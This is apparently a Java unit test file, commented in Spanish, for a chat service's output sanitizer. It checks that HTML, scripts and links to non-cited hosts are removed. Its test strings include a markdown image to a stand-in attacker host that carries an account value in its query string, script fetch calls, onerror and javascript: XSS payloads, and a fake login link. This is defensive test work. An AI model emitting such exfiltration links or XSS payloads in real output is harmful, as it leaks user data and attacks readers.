package com.idp.chat.service;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;

/** La salida del modelo es texto plano: sin HTML, imagenes, enlaces ni URLs ajenas a las citas. */
class OutputSanitizerTest {

    @Test
    void quitaImagenMarkdownConQueryString() {
        String out = OutputSanitizer.sanitize("Resumen ![a](https://evil.example/p.png?q=cuenta123&t=9) fin", Set.of());
        assertThat(out).isEqualTo("Resumen fin").doesNotContain("evil").doesNotContain("cuenta123");
    }

    @Test
    void quitaScriptConSuContenidoYEtiquetas() {
        String out = OutputSanitizer.sanitize("A<script>fetch('https://x')</script>B <b onclick=\"x()\">C</b> "
                + "<img src=x onerror=alert(1)> <iframe src=//x></iframe>D", Set.of());
        assertThat(out).doesNotContain("<").doesNotContain("fetch").doesNotContain("onerror").doesNotContain("alert");
        assertThat(out).contains("A").contains("B").contains("C").contains("D");
    }

    @Test
    void etiquetaSinCerrarNoSobrevive() {
        assertThat(OutputSanitizer.sanitize("Hola <script src=//evil", Set.of())).isEqualTo("Hola");
    }

    @Test
    void enlaceMarkdownConservaSoloElTexto() {
        String out = OutputSanitizer.sanitize("Consulte [el portal](https://evil.example/login) hoy", Set.of());
        assertThat(out).isEqualTo("Consulte el portal hoy");
    }

    @Test
    void urlsAjenasALasCitasSeEliminan() {
        String out = OutputSanitizer.sanitize("Ver https://evil.example/a?x=1 o www.evil.example, javascript:alert(1)",
                Set.of());
        assertThat(out).doesNotContain("evil").doesNotContain("javascript");
        assertThat(out).contains(OutputSanitizer.REMOVED_LINK);
    }

    @Test
    void urlPresenteEnUnaCitaSePermite() {
        Set<String> allowed = OutputSanitizer.urlsIn(List.of("consulte https://www.rama.gov.co/oficio ahora"));
        assertThat(OutputSanitizer.sanitize("Fuente: https://www.rama.gov.co/oficio.", allowed))
                .contains("https://www.rama.gov.co/oficio");
        assertThat(OutputSanitizer.sanitize("Fuente: https://otro.example/oficio", allowed)).doesNotContain("otro");
    }

    @Test
    void definicionesDeReferenciaSeQuitanYMarcadoresNoSeAlteran() {
        String out = OutputSanitizer.sanitize("Texto [1] y mas [2] (ver anexo)\n[x]: https://evil.example\nfin", Set.of());
        assertThat(out).contains("[1]").contains("[2] (ver anexo)").doesNotContain("evil");
    }
}
